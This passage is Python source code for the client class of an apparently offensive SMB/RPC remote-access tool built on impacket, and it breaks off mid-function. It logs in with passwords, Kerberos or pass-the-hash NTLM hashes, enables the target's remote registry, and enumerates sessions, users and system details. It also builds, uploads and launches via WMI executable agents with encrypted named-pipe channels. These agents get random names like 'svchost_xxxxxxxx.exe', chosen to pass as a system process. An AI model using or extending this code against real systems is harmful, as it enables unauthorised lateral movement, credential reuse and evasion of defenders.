from slingerpkg.lib.schtasks import schtasks
from slingerpkg.lib.winreg import winreg
from slingerpkg.lib.atexec import atexec
from slingerpkg.lib.wmiexec import wmiexec
from slingerpkg.lib.scm import scm
from slingerpkg.lib.smblib import smblib
from slingerpkg.lib.secrets import secrets
from slingerpkg.lib.eventlog import EventLog
from slingerpkg.lib.named_pipes import NamedPipeEnumerator
from slingerpkg.lib.wmi_namedpipe import WMINamedPipeExec
from slingerpkg.lib.named_pipe_client import NamedPipeClientWin32, NamedPipeClientCtypes
from slingerpkg.utils.printlib import *
from slingerpkg.utils.common import *
from slingerpkg.lib.dcetransport import DCETransport
import datetime
from impacket import smbconnection
from impacket.dcerpc.v5.rpcrt import DCERPCException
import slingerpkg.var.config as config
import traceback

dialect_mapping = {
    0x02FF: "SMB 1.0",
    0x031F: "SMB 2.0.2",
    0x0302: "SMB 2.1",
    0x0300: "SMB 3.0",
    0x0311: "SMB 3.0.2",
    0x0312: "SMB 3.1.1",
}


class SlingerClient(
    winreg,
    schtasks,
    scm,
    smblib,
    secrets,
    atexec,
    wmiexec,
    EventLog,
    WMINamedPipeExec,
    DCETransport,
):
    def __init__(
        self, host, username, password, domain, port=445, ntlm_hash=None, use_kerberos=False
    ):
        schtasks.__init__(self)
        winreg.__init__(self)
        scm.__init__(self)
        smblib.__init__(self)
        secrets.__init__(self)
        atexec.__init__(self)
        wmiexec.__init__(self)
        EventLog.__init__(self)
        WMINamedPipeExec.__init__(self)
        DCETransport.__init__(self, host, username, port, None)  # SMB connection set later
        self.host = host
        self.username = username
        self.password = password
        self.domain = domain
        self.port = port
        self.ntlm_hash = ntlm_hash
        self.use_kerberos = use_kerberos
        self.conn = None
        self.share = None
        self.current_path = ""
        self.tree_id = None
        self.relative_path = ""
        self.is_connected_to_share = False
        self.is_logged_in = False
        self.port = port
        self.session_start_time = datetime.datetime.now()
        self.dialect = None
        self.smb_version = None
        self.dce_transport = None
        self.srvsvc_pipe = None
        self.wkssvc_pipe = None

    def setup_dce_transport(self):
        """
        Sets up or reuses the DCE transport for RPC communication.
        """
        if not self.dce_transport or not self.dce_transport.is_connected:
            self.dce_transport = DCETransport(self.host, self.username, self.port, self.conn)
            self.dce_transport.set_timeout(config.smb_conn_timeout)
        else:
            print_debug("Reusing existing DCE transport.")

    def login(self):
        print_info(f"Connecting to {self.host}:{self.port}...")
        try:
            self.conn = smbconnection.SMBConnection(
                self.host, self.host, sess_port=self.port, timeout=15
            )
        except Exception as e:
            print_debug(str(e), sys.exc_info())
            if "Connection error" in str(e):
                print_bad(f"Failed to connect to {self.host}:{self.port}")
                sys.exit()

        if self.conn is None or self.conn == "":
            self.is_logged_in = False
            raise Exception("Failed to create SMB connection.")

        self.conn._timeout = int(config.smb_conn_timeout)

        try:
            if self.use_kerberos:
                self.conn.kerberosLogin(
                    self.username,
                    self.password,
                    domain=self.domain,
                    lmhash="",
                    nthash="",
                    aesKey="",
                    TGT=None,
                    TGS=None,
                )
            elif self.ntlm_hash:
                # get nt and lm hashes from ntlm hash
                try:
                    nt_hash = self.ntlm_hash.split(":")[1]
                    lm_hash = self.ntlm_hash.split(":")[0]
                except IndexError:
                    print_bad("Invalid NTLM hash. Format should be LM:NT or :NT")
                    sys.exit()
                self.conn.login(
                    self.username, self.password, domain=self.domain, lmhash=lm_hash, nthash=nt_hash
                )
            else:
                self.conn.login(self.username, self.password, domain=self.domain)
            print_good(f"Successfully logged in to {self.host}:{self.port}")

            # Update DCE transport with established SMB connection
            self.conn = self.conn  # Update the DCE transport SMB connection

            GRN_BLD = "\033[1;32m"
            RST = "\033[0m"
            print("\nStart Time: " + GRN_BLD + str(self.session_start_time) + RST + "\n")
        except Exception as e:
            print_debug(str(e), sys.exc_info())
            if "STATUS_LOGON_FAILURE" in str(e):
                print_bad(f"Authentication Failed {self.host}:{self.port}")
                sys.exit()
            elif "STATUS_ACCOUNT_RESTRICTION" in str(e):
                print_good("Login Successful")
                print_bad(f"Account is restricted {self.host}:{self.port}")
                sys.exit()
            else:
                print_bad(f"Login Failed {self.host}:{self.port}")
                print_log(str(e) + "\n" + str(sys.exc_info()))
            sys.exit()
        # set a large timeout
        self.conn.timeout = config.smb_conn_timeout
        self.is_logged_in = True
        self.dialect = self.conn.getDialect()
        self.smb_version = dialect_mapping.get(self.dialect, "Unknown")
        try:
            self.dce_transport = DCETransport(self.host, self.username, self.port, self.conn)
        except Exception as e:
            print_bad(f"Unable to setup DCE transport: {e}")
            raise e

        self.dce_transport._enable_remote_registry()
        # self.setup_remote_registry(args=None)

    # handle exit
    def exit(self):
        try:
            self.dce_transport._disconnect()
            try:
                self.conn.logoff()
            except Exception as e:
                pass
                # print_debug(str(e), sys.exc_info())
            GRN_BLD = "\033[1;32m"
            RST = "\033[0m"
            CURRENT_TIME = datetime.datetime.now()
            print("\nStop Time: " + GRN_BLD + str(CURRENT_TIME) + RST + "\n")

        except Exception as e:
            print_debug(str(e), sys.exc_info())

        # Cleanup WMI connections if they exist
        try:
            if hasattr(self, "_wmi_services") and hasattr(self, "cleanup_wmi"):
                print_debug("Cleaning up WMI connections...")
                self.cleanup_wmi()
        except Exception as e:
            print_debug(f"WMI cleanup error: {e}")

        self.conn = None

    def is_connected_to_remote_share(self):
        return self.conn and self.is_connected_to_share

    def info(self, args=None):
        dialect_mapping = {
            0x02FF: "SMB 1.0",
            0x031F: "SMB 2.0.2",
            0x0302: "SMB 2.1",
            0x0300: "SMB 3.0",
            0x0311: "SMB 3.0.2",
            0x0312: "SMB 3.1.1",
        }
        dialect = self.conn.getDialect()
        smb_version = dialect_mapping.get(dialect, "Unknown")
        print_log(f"Remote Name: {self.conn.getRemoteName()}")
        print_log(f"Remote Host: {self.conn.getRemoteHost()}")
        print_log(f"SMB Version: {smb_version}")
        print_log(f"Connected: {self.is_connected_to_share}")
        if self.is_connected_to_share:
            print_log(f"Share: {self.share}")
            print_log(f"Current Path: {self.current_path}")

        print_log(f"Logged in: {self.is_logged_in}")
        print_log(f"Total time of session: {datetime.datetime.now() - self.session_start_time}")

    def history_handler(self, args):
        """Display command history from the slinger history file"""
        try:
            import os
            from slingerpkg.utils.common import get_config_value
            from slingerpkg.utils.printlib import print_log, print_bad, print_info

            # Get history file location from config
            hist_file = os.path.expanduser(get_config_value("History_File"))

            # Check if history file exists
            if not os.path.exists(hist_file):
                print_bad(f"History file not found: {hist_file}")
                return

            # Read history file
            with open(hist_file, "r") as f:
                lines = f.readlines()

            # Get the number of lines to display (default 15)
            num_lines = args.n if hasattr(args, "n") else 15

            # Get last N lines
            history_lines = lines[-num_lines:]

            # Display history
            print_info(f"Last {len(history_lines)} commands:")
            for i, line in enumerate(history_lines, start=len(lines) - len(history_lines) + 1):
                print_log(f"{i:4d}  {line.rstrip()}")

        except Exception as e:
            from slingerpkg.utils.printlib import print_bad

            print_bad(f"Failed to read history: {e}")

    def who(self, args=None):
        """
        Executes the 'who' command to retrieve session information.
        Reuses the transport and resets it if needed.
        """
        try:
            # Setup or reuse transport
            self.setup_dce_transport()
            if "srvsvc" not in self.dce_transport.pipe:
                self.dce_transport._connect("srvsvc")
            # Execute the 'who' command
            resp = self.dce_transport._who()
            for session in resp["InfoStruct"]["SessionInfo"]["Level10"]["Buffer"]:
                print_log(
                    "host: %15s, user: %5s, active: %5d, idle: %5d"
                    % (
                        session["sesi10_cname"][:-1],
                        session["sesi10_username"][:-1],
                        session["sesi10_time"],
                        session["sesi10_idle_time"],
                    )
                )
        except DCERPCException as e:
            print_debug(str(e), sys.exc_info())
            print_bad(f"Failed to list sessions: {e}")
            raise e
        except Exception as e:
            # Reset the transport on unexpected errors
            print_debug(f"Unexpected error: {str(e)}. Resetting transport.", sys.exc_info())
            self.dce_transport._disconnect()
            self.setup_dce_transport()
            raise e

    def enum_server_disk(self, args=None):
        try:
            self.setup_dce_transport()
            self.dce_transport._connect("srvsvc")

            response = self.dce_transport._enum_server_disk()
            if response["ErrorCode"] == 0:  # Checking for successful response
                disk_enum = response["DiskInfoStruct"]["Buffer"]
                print_log("Disk Drives:")
                for disk in disk_enum:
                    print_log(f"  {disk['Disk']}  ", end="")
                print_log()
            else:
                print_log(f"Error: {response['ErrorCode']}")
        except Exception as e:
            print_debug(str(e), sys.exc_info())
            print_log(f"An error occurred: {str(e)}")
            raise e

    def enum_logons(self, args=None):
        self.setup_dce_transport()
        self.dce_transport._connect("wkssvc")
        response = self.dce_transport._enum_logons()
        print_info("Logged on Users:")
        for user_info in response["UserInfo"]["WkstaUserInfo"]["Level1"]["Buffer"]:
            print_log(f"Username: {user_info['wkui1_username']}")

    def enum_sys(self, args=None):
        self.setup_dce_transport()
        self.dce_transport._connect("wkssvc")
        response = self.dce_transport._enum_sys()
        # Assuming you have a response from NetrWkstaGetInfo
        info = response["WkstaInfo"]["WkstaInfo102"]

        print_log("Workstation Information:")
        print_log(f"Platform ID: {info['wki102_platform_id']}")
        print_log(f"Computer Name: {info['wki102_computername']}")
        print_log(f"Domain Name: {info['wki102_langroup']}")
        print_log(f"Version Major: {info['wki102_ver_major']}")
        print_log(f"Version Minor: {info['wki102_ver_minor']}")
        print_log(f"Logged-on Users: {info['wki102_logged_on_users']}")

    def enum_transport(self, args=None):
        self.setup_dce_transport()
        self.dce_transport._connect("wkssvc")
        response = self.dce_transport._enum_transport()
        transports = response["TransportInfo"]["WkstaTransportInfo"]["Level0"]["Buffer"]

        print_info("Transport Information:")
        for transport in transports:
            print_log(f"Quality Of Service: {transport['wkti0_quality_of_service']}")
            print_log(f"Number of VCs: {transport['wkti0_number_of_vcs']}")

            # Decode the transport name and address from bytes to string
            transport_name = transport["wkti0_transport_name"]
            transport_address = transport["wkti0_transport_address"]

            print_log(f"Transport Name: {transport_name}")
            readable_mac_address = ":".join(
                transport_address[i : i + 2] for i in range(0, len(transport_address), 2)
            )
            print_log(f"Readable Transport Address (MAC): {readable_mac_address}")
            print_log(f"WAN ISH: {transport['wkti0_wan_ish']}")
            print_log()

    def enum_info(self, args=None):
        self.setup_dce_transport()
        self.dce_transport._connect("srvsvc")
        response = self.dce_transport._enum_info()
        # print_log(response.dump())
        print_info("Server Info:")
        info = response["InfoStruct"]["ServerInfo101"]
        print_log(f"Server name: {info['sv101_name']}")
        print_log(f"Server platform id: {info['sv101_platform_id']}")
        print_log(f"Server version: {info['sv101_version_major']}.{info['sv101_version_minor']}")
        print_log(f"Server type: {info['sv101_type']}")
        print_log(f"Server comment: {info['sv101_comment']}")

        # Processor Arch
        response = self.get_processor_architecture()
        print_info(f"Processor Architecture:")
        print_log(f"Architecture: {response}-bit")

        # Enumerate the server disk drives
        print_info("Server Disk Info:")
        self.enum_server_disk()

        # Processor Info
        print_info("Processor Info:")
        response = self._sys_proc_info(args, echo=False)
        print_log(f"Processor Name:\t{response['ProcessorNameString']}")
        print_log(f"Processor ID:\t{response['Identifier']}")
        print_log(f"Vendor ID:\t{response['VendorIdentifier']}")

        # System time
        print_info("System Time:")
        response = self._sys_time_info(args, echo=False)
        # convert the time to a readable format
        last_known_good_time_hex = response["LastKnownGoodTime"]  # Example: '0x1db6cdf8f0b399a'
        # Convert hex string to an integer
        last_known_good_time_int = int(last_known_good_time_hex, 16)
        # Convert Windows File Time to seconds since UNIX epoch
        # Windows File Time is the number of 100-nanosecond intervals since January 1, 1601 UTC
        unix_time = (last_known_good_time_int - 116444736000000000) // 10000000
        # Convert to a human-readable datetime
        sys_time = datetime.datetime.fromtimestamp(unix_time, tz=datetime.timezone.utc)
        print_log(f"Time (UTC):\t{sys_time}")
        last_shutdown_str = self._sys_shutdown_info(args, hex_dump=True, echo=False)
        last_shutdown = datetime.datetime.strptime(last_shutdown_str, "%Y-%m-%d %H:%M:%S").replace(
            tzinfo=datetime.timezone.utc
        )
        print_log(f"Last Shutdown Time (UTC): {last_shutdown_str}")
        # calc uptime sys_time - last_shutdown
        uptime = sys_time - last_shutdown
        uptime_str = str(uptime).split(".")[0]
        print_log(f"Uptime: {uptime_str}")

    def get_server_time(self, args=None):
        # print local date and time
        time = datetime.datetime.now()
        date = datetime.date.today()
        print_info(f"Local Time: {time.hour}:{time.minute}:{time.second}")
        print_info(f"Local Date: {date.month}/{date.day}/{date.year}")

        try:
            self.setup_dce_transport()
            self.dce_transport._connect("srvsvc")
            response = self.dce_transport._fetch_server_time()
            if response["ErrorCode"] == 0:  # Checking for successful response
                tod_info = response["BufferPtr"]
                # Server current time
                hours = tod_info["tod_hours"]
                minutes = tod_info["tod_mins"]
                seconds = tod_info["tod_secs"]
                current_time = f"{hours:02d}:{minutes:02d}:{seconds:02d}"

                # Server current date
                day = tod_info["tod_day"]
                month = tod_info["tod_month"]
                year = tod_info["tod_year"]
                weekday = tod_info["tod_weekday"]
                weekdays = [
                    "Sunday",
                    "Monday",
                    "Tuesday",
                    "Wednesday",
                    "Thursday",
                    "Friday",
                    "Saturday",
                ]
                current_date = f"{month:02d}/{day:02d}/{year}"
                day_name = weekdays[weekday] if 0 <= weekday < 7 else "Unknown"

                # Server uptime
                uptime_seconds = int(tod_info["tod_elapsedt"]) // 1000
                uptime_days = uptime_seconds // 86400
                uptime_hours = (uptime_seconds % 86400) // 3600
                uptime_minutes = (uptime_seconds % 3600) // 60
                if uptime_days > 0:
                    uptime = f"{uptime_days} days, {uptime_hours} hours, {uptime_minutes} minutes"
                else:
                    uptime = f"{uptime_hours} hours, {uptime_minutes} minutes"

                # Server timezone
                tz_minutes = int(tod_info["tod_timezone"])
                tz_hours, tz_mins = divmod(abs(tz_minutes), 60)
                tz_sign = "+" if tz_minutes >= 0 else "-"
                timezone = f"UTC{tz_sign}{tz_hours:02d}:{tz_mins:02d}"

                # Display the extracted information
                print_info(f"Server Time: {current_time}")
                print_info(f"Server Date: {current_date} ({day_name})")
                print_info(f"Server Uptime: {uptime}")
                print_info(f"Server Timezone: {timezone}")

            else:
                print_log(f"Error: {response['ErrorCode']}")
        except Exception as e:
            print_debug(str(e), sys.exc_info())
            print_log(f"An error occurred: {str(e)}")
            raise e

    def check_if_connected(self):
        if self.conn is None or self.is_connected_to_remote_share() is False:
            print_warning("No share is connected. Use the 'use' command to connect to a share.")
            self.is_connected_to_share = False
            return False
        self.is_connected_to_share = True
        return True

    def downloads_list_handler(self, args):
        """Handle 'downloads list' command to show active resumable downloads"""
        from slingerpkg.lib.download_state import DownloadStateManager
        from tabulate import tabulate

        try:
            active_downloads = DownloadStateManager.list_active_downloads()

            if not active_downloads:
                print_info("No active resumable downloads found.")
                return

            print_info(f"Found {len(active_downloads)} active resumable downloads:")

            # Prepare table data
            table_data = []
            for download in active_downloads:
                local_path = download["local_path"]
                remote_path = download["remote_path"]
                progress = download["progress"]
                bytes_downloaded = self.sizeof_fmt(download["bytes_downloaded"])
                total_size = self.sizeof_fmt(download["total_size"])
                last_modified = (
                    download["last_modified"][:19] if download["last_modified"] else "Unknown"
                )

                # Truncate paths if too long
                if len(local_path) > 40:
                    local_path = "..." + local_path[-37:]
                if len(remote_path) > 40:
                    remote_path = "..." + remote_path[-37:]

                table_data.append(
                    [
                        local_path,
                        remote_path,
                        f"{progress:.1f}%",
                        f"{bytes_downloaded}/{total_size}",
                        last_modified,
                    ]
                )

            headers = ["Local Path", "Remote Path", "Progress", "Downloaded", "Last Modified"]
            print(tabulate(table_data, headers=headers, tablefmt="grid"))

        except Exception as e:
            print_debug(f"Error listing downloads: {e}", sys.exc_info())
            print_bad(f"Failed to list downloads: {e}")

    def downloads_cleanup_handler(self, args):
        """Handle 'downloads cleanup' command to clean up download states"""
        from slingerpkg.lib.download_state import DownloadStateManager

        try:
            if not args.force:
                response = input("Clean up completed and stale download states? [y/N]: ")
                if response.lower() not in ["y", "yes"]:
                    print_info("Cleanup cancelled.")
                    return

            # Clean up completed downloads
            completed_count = DownloadStateManager.cleanup_completed_downloads()
            print_info(f"Cleaned up {completed_count} completed downloads.")

            # Clean up stale downloads
            max_age = getattr(args, "max_age", 7)
            stale_count = DownloadStateManager.cleanup_stale_downloads(max_age)
            print_info(f"Cleaned up {stale_count} stale downloads (older than {max_age} days).")

            total_cleaned = completed_count + stale_count
            if total_cleaned > 0:
                print_good(f"Total cleaned up: {total_cleaned} download state files.")
            else:
                print_info("No download states needed cleanup.")

        except Exception as e:
            print_debug(f"Error during cleanup: {e}", sys.exc_info())
            print_bad(f"Failed to cleanup downloads: {e}")

    def eventlog_handler(self, args):
        """Handle eventlog commands"""
        print_debug(f"Eventlog action: {args.eventlog_action}")
        try:
            # Handle different eventlog actions using self methods
            if args.eventlog_action == "list":
                print_verbose("Listing Event Logs...")
                self.list_event_logs(args)
            elif args.eventlog_action == "query":
                print_verbose("Querying Event Log: " + args.log)
                self.query_event_log(args)
            elif args.eventlog_action == "check":
                print_verbose("Checking Log: " + args.log)
                self.check_event_log(args.log)
            else:
                print_bad(f"Unknown eventlog action: {args.eventlog_action}")

        except Exception as e:
            print_bad(f"EventLog error: {e}")
            print_debug(f"Traceback: {traceback.format_exc()}")

    def reconnect_handler(self, args):
        """Reconnect to the server"""
        try:
            print_info("Reconnecting to the server...")

            # Store current connection info
            host = self.host
            username = self.username
            password = self.password
            domain = self.domain
            ntlm_hash = self.ntlm_hash
            current_share = self.share if hasattr(self, "share") else None
            current_path = getattr(self, "current_path", None) if current_share else None

            # Close existing connection
            try:
                if hasattr(self, "conn") and self.conn:
                    self.conn.close()
            except:
                pass

            # Create new connection
            self.conn = smbconnection.SMBConnection(host, host, sess_port=445)

            # Re-authenticate
            if ntlm_hash:
                lmhash, nthash = ntlm_hash.split(":")
                self.conn.login(username, password, domain, lmhash, nthash)
            else:
                self.conn.login(username, password, domain)

            # Try to reconnect to the original share if we had one
            if current_share:
                try:
                    self.conn.connectTree(current_share)
                    self.share = current_share
                    self.is_connected_to_share = True
                    print_success(f"Reconnected to share: {current_share}")

                    # Try to change back to the original path
                    if current_path and current_path != "/":
                        try:
                            self.cd_no_output(current_path)
                            print_info(
                                f"Current directory: {getattr(self, 'current_path', 'Unknown')}"
                            )
                        except:
                            print_warning(f"Could not change back to original path: {current_path}")
                            print_info(
                                f"Current directory: {getattr(self, 'current_path', 'Unknown')}"
                            )

                except Exception as e:
                    print_bad(f"Failed to reconnect to share {current_share}: {e}")
                    self.is_connected_to_share = False
            else:
                print_success("Reconnected to server")

        except Exception as e:
            print_bad(f"Failed to reconnect: {e}")

    def agent_handler(self, args):
        """Handle agent commands for cooperative agent building"""
        try:
            # Import the agent builder
            import sys
            import os

            print_debug("Starting agent_handler execution")
            print_debug(f"Current file: {__file__}")
            print_debug(f"Python path: {sys.path}")

            # Try direct import first (since we copied the file to slingerpkg/lib)
            try:
                from slingerpkg.lib.cooperative_agent import build_cooperative_agent, AgentBuilder

                print_debug("Successfully imported from slingerpkg.lib.cooperative_agent")
            except ImportError as import_error:
                print_debug(f"Direct import failed: {import_error}")
                print_debug("Attempting fallback import path")

                # Fallback: Add lib directory to path for cooperative_agent import
                lib_path = os.path.join(
                    os.path.dirname(os.path.dirname(os.path.dirname(__file__))), "lib"
                )
                print_debug(f"Trying lib path: {lib_path}")
                if lib_path not in sys.path:
                    sys.path.insert(0, lib_path)

                from cooperative_agent import build_cooperative_agent, AgentBuilder

                print_debug("Successfully imported from fallback path")

            if args.agent_command == "build":
                # Handle dry run mode
                if hasattr(args, "dry_run") and args.dry_run:
                    print_info("Checking build readiness (dry run)...")

                    # Get the project root directory - go up from slingerpkg/lib/slingerclient.py
                    current_file_dir = os.path.dirname(__file__)  # slingerpkg/lib
                    slingerpkg_dir = os.path.dirname(current_file_dir)  # slingerpkg
                    src_dir = os.path.dirname(slingerpkg_dir)  # src
                    base_path = os.path.dirname(src_dir)  # project root

                    print_debug(f"Calculated base_path for dry-run: {base_path}")
                    print_debug(f"Expected lib path: {os.path.join(base_path, 'lib')}")

                    builder = AgentBuilder(base_path)
                    deps = builder.check_build_dependencies()

                    print_log(f"Architecture: {args.arch}")
                    print_log(
                        f"Encryption: {'Enabled' if args.encryption and not args.no_encryption else 'Disabled'}"
                    )
                    print_log(f"Debug mode: {'Enabled' if args.debug else 'Disabled'}")

                    if deps.get("cmake", False) and deps.get("cpp_compiler", False):
                        print_good("\n✓ All dependencies available - ready to build")
                        print_info("Run without --dry-run to actually build the agent")
                    else:
                        print_bad("\n✗ Missing dependencies:")
                        if not deps.get("cmake", False):
                            print_log("  ✗ CMake not found")
                        if not deps.get("cpp_compiler", False):
                            print_log("  ✗ C++ compiler not found")
                    return

                print_info("Building cooperative agent...")

                # Show pipe name configuration
                custom_pipe = getattr(args, "pipe", None)
                if custom_pipe:
                    print_info(f"Using custom pipe name: {custom_pipe}")
                else:
                    print_info("Using time-based random pipe name (determined at runtime)")

                # Handle encryption settings
                encryption = args.encryption and not args.no_encryption
                print_debug(f"Encryption enabled: {encryption}")

                # Determine output directory
                output_dir = (
                    args.output_dir if hasattr(args, "output_dir") and args.output_dir else None
                )
                print_debug(f"Output directory: {output_dir}")

                # Get the project root directory for building - same calculation as dry-run
                current_file_dir = os.path.dirname(__file__)  # slingerpkg/lib
                slingerpkg_dir = os.path.dirname(current_file_dir)  # slingerpkg
                src_dir = os.path.dirname(slingerpkg_dir)  # src
                base_path = os.path.dirname(src_dir)  # project root

                print_debug(f"Calculated base_path for build: {base_path}")
                print_debug(
                    f"Template directory: {os.path.join(base_path, 'lib', 'agent_templates')}"
                )

                # Build the agent(s)
                print_debug(
                    f"Starting build with arch={args.arch}, encryption={encryption}, debug={args.debug}"
                )
                built_agents = build_cooperative_agent(
                    arch=args.arch,
                    encryption=encryption,
                    debug=args.debug,
                    base_path=base_path,
                    custom_pipe_name=getattr(args, "pipe", None),
                )

                if built_agents:
                    print_good(f"Successfully built {len(built_agents)} agent(s):")
                    for agent_path in built_agents:
                        file_size = os.path.getsize(agent_path) if os.path.exists(agent_path) else 0
                        print_log(f"  {agent_path} ({file_size:,} bytes)")

                    # Show pipe name guidance
                    if getattr(args, "pipe", None):
                        print_info(f"\n💡 Agents built with custom pipe name: {args.pipe}")
                        print_info(f"   Pipe name automatically used during deployment")
                        print_info(f"   Deploy with: agent deploy <agent.exe> --path \\ --start")
                    else:
                        print_info("\n💡 These agents use time-based random pipe names")
                        print_info("   The actual pipe name will be determined when the agent runs")
                        print_info("   Deploy with: agent deploy <agent.exe> --path \\ --start")

                    print_info(
                        "   Use 'agent use <id>' to connect (pipe name tracked automatically)"
                    )

                else:
                    print_bad("Failed to build agents. Check build dependencies.")
                    print_info("Required: CMake, C++ compiler (MSVC/MinGW)")

            elif args.agent_command == "info":
                print_info("Cooperative Agent Builder Information")

                # Get the project root directory - same calculation as build
                current_file_dir = os.path.dirname(__file__)  # slingerpkg/lib
                slingerpkg_dir = os.path.dirname(current_file_dir)  # slingerpkg
                src_dir = os.path.dirname(slingerpkg_dir)  # src
                base_path = os.path.dirname(src_dir)  # project root

                print_debug(f"Calculated base_path for info: {base_path}")

                builder = AgentBuilder(base_path)
                info = builder.get_build_info()

                print_log(f"Template Directory: {info['template_dir']}")
                print_log(f"Build Directory: {info['build_dir']}")
                print_log(f"Output Directory: {info['output_dir']}")
                print_log(f"Supported Architectures: {', '.join(info['supported_architectures'])}")

                print_info("\nBuild Dependencies:")
                deps = info["dependencies"]
                cmake_status = "✓" if deps["cmake_available"] else "✗"
                compiler_status = "✓" if deps["cpp_compiler_available"] else "✗"
                print_log(
                    f"  {cmake_status} CMake: {'Available' if deps['cmake_available'] else 'Not found'}"
                )
                print_log(
                    f"  {compiler_status} C++ Compiler: {deps['compiler_found'] if deps['cpp_compiler_available'] else 'Not found'}"
                )

                print_info("\nTemplate Files:")
                for template in info["template_files"]:
                    print_log(f"  ✓ {template}")

                print_info("\nCurrent Build Configuration:")
                print_log(f"  Encryption Seed: {info['encryption_seed']}")
                print_log(f"  Layout Seed: {info['layout_seed']}")

                # Show built agents and deployment status
                self._show_built_agents_status(info["output_dir"])

                # Show build readiness
                if deps["cmake_available"] and deps["cpp_compiler_available"]:
                    print_good("\n✓ System ready for agent building")
                else:
                    print_warning("\n⚠ Missing build dependencies - install CMake and C++ compiler")

            elif args.agent_command == "deploy":
                self.agent_deploy_handler(args)

            elif args.agent_command == "list":
                self.agent_list_handler(args)

            elif args.agent_command == "use":
                self.agent_use_handler(args)

            elif args.agent_command == "rename":
                self.agent_rename_handler(args)

            elif args.agent_command == "check":
                self.agent_check_handler(args)

            elif args.agent_command == "kill":
                self.agent_kill_handler(args)

            elif args.agent_command == "rm":
                self.agent_rm_handler(args)

            elif args.agent_command == "update":
                self.agent_update_handler(args)

            else:
                print_bad(f"Unknown agent command: {args.agent_command}")
                print_info(
                    "Available commands: build, info, deploy, list, use, rename, check, kill, rm, update"
                )

        except ImportError as e:
            print_bad(f"Agent builder not available: {e}")
            print_debug(f"ImportError details: {e}")
            print_debug(f"Current working directory: {os.getcwd()}")
            print_debug(f"__file__ path: {__file__}")
            print_info("Ensure cooperative_agent.py is in lib/ directory")
        except Exception as e:
            print_bad(f"Agent command failed: {e}")
            print_debug(f"Exception type: {type(e).__name__}")
            print_debug(f"Exception details: {e}")
            if hasattr(args, "debug") and args.debug:
                import traceback

                print_debug("Full traceback:")
                traceback.print_exc()

    def agent_deploy_handler(self, args):
        """Handle agent deployment to target system"""
        try:
            import os
            import random
            import string
            import json
            import datetime
            from slingerpkg.utils.printlib import (
                print_info,
                print_good,
                print_bad,
                print_warning,
                print_log,
                print_debug,
                print_verbose,
            )

            # Check prerequisites
            if not self.is_logged_in:
                print_bad("Not logged in. Please authenticate first.")
                return

            if not self.is_connected_to_share:
                print_bad("Not connected to a share. Use 'connect <share>' first.")
                print_info("Example: connect C$")
                return

            # Validate agent file exists
            if not os.path.exists(args.agent_path):
                print_bad(f"Agent file not found: {args.agent_path}")
                return

            # Generate agent name if not provided
            if args.name:
                agent_name = args.name
                if not agent_name.endswith(".exe"):
                    agent_name += ".exe"
            else:
                # Generate random name that looks like a system process
                agent_id = "".join(random.choices(string.ascii_lowercase + string.digits, k=8))
                agent_name = f"svchost_{agent_id}.exe"

            print_info(f"Deploying agent: {os.path.basename(args.agent_path)}")
            print_info(f"Current share: {self.share}")
            print_info(f"Target path: {args.path}")
            print_info(f"Agent name: {agent_name}")

            # Use existing upload functionality - args.path is relative to current share
            target_path = args.path.rstrip("\\")
            if target_path and not target_path.endswith("\\"):
                remote_path = f"{target_path}\\{agent_name}"
            else:
                remote_path = agent_name

            print_info(f"Uploading to: {self.share}\\{remote_path}")

            try:
                # Use the existing upload method from smblib
                self.upload(args.agent_path, remote_path)
                print_good(f"✓ Agent uploaded successfully")

                # Start agent if requested
                if args.start:
                    print_info("Starting agent via WMI DCOM...")

                    # Build full execution path
                    # Convert share to drive letter (C$->C:, D$->D:, etc.)
                    if self.share.endswith("$"):
                        drive = self.share[:-1] + ":"
                        full_path = f"{drive}\\{remote_path}"
                    else:
                        # For named shares, assume C: drive
                        full_path = f"C:\\{self.share}\\{remote_path}"

                    full_path = full_path.replace("\\\\", "\\")  # Clean up double slashes

                    try:
                        # Use existing WMI execution capability
                        # Start agent directly (not using start /b to capture PID)
                        command = f'"{full_path}"'
                        print_verbose(f"Executing: {command}")

                        result = self.execute_wmi_command(command, capture_output=False, timeout=10)

                        if result.get("success", False):
                            print_good("✓ Agent started successfully")

                            # Get process ID from WMI execution result (this is the parent process)
                            process_id = result.get("process_id")
                            if process_id:
                                print_good(f"✓ Agent PPID: {process_id} (parent process)")

                            # Store agent info for tracking
                            agent_id = agent_name.replace(".exe", "")

                            # Determine pipe name: --pipe flag > build registry > discovery placeholder
                            build_info = self._lookup_build_registry(args.agent_path)
                            if hasattr(args, "pipe") and args.pipe:
                                pipe_name = args.pipe
                                pipe_source = "flag"
                            elif build_info and build_info.get("pipe_name"):
                                pipe_name = build_info["pipe_name"]
                                pipe_source = "registry"
                            else:
                                # For agents without known pipe names, use placeholder that will be discovered later
                                pipe_name = (
                                    f"slinger_agent_{agent_id}"  # placeholder, will be discovered
                                )
                                pipe_source = "placeholder"

                            # Get XOR key from build registry (encryption_seed & 0xFF)
                            xor_key = None
                            if build_info and "encryption_seed" in build_info:
                                xor_key = build_info["encryption_seed"] & 0xFF

                            agent_info = {
                                "id": agent_id,
                                "name": agent_name,
                                "host": self.host,
                                "path": full_path,
                                "pipe_name": pipe_name,
                                "xor_key": xor_key,
                                "process_id": process_id,
                                "deployed_at": str(datetime.datetime.now()),
                                "status": "running",
                            }

                            # Save agent info to local registry
                            self._save_agent_info(agent_info)

                            print_good(f"✓ Agent deployed with ID: {agent_id}")
                            print_info(f"Agent process: {agent_name}")

                            # Show pipe name source
                            if pipe_source == "flag":
                                print_info(f"Pipe name: {pipe_name} (from --pipe flag)")
                            elif pipe_source == "registry":
                                print_info(f"Pipe name: {pipe_name} (from build registry)")
                            else:
                                print_info(
                                    f"Pipe name: {pipe_name} (placeholder - will be discovered)"
                                )

                            print_info(f"Named pipe: \\\\{self.host}\\pipe\\{pipe_name}")
                            print_warning(f"Use 'agent use {agent_id}' to interact with this agent")
                            print_info(f"Use 'agent list' to see all deployed agents")
                        else:
                            print_bad(
                                f"Failed to start agent: {result.get('error', 'Unknown error')}"
                            )
                            print_info("Agent uploaded but not started - you may start it manually")

                    except Exception as e:
                        print_warning(f"Agent uploaded but failed to start: {e}")
                        print_info("You may need to start it manually or check WMI connectivity")

            except Exception as e:
                print_bad(f"Failed to upload agent: {e}")
                return

        except Exception as e:
            print_bad(f"Agent deployment failed: {e}")
            print_debug(f"Exception details: {e}")

    def _save_agent_info(self, agent_info):
        """Save agent information to local registry file"""
        try:
            import json
            import os
            from pathlib import Path

            # Create agents directory in user's home
            agents_dir = Path.home() / ".slinger" / "agents"
            agents_dir.mkdir(parents=True, exist_ok=True)

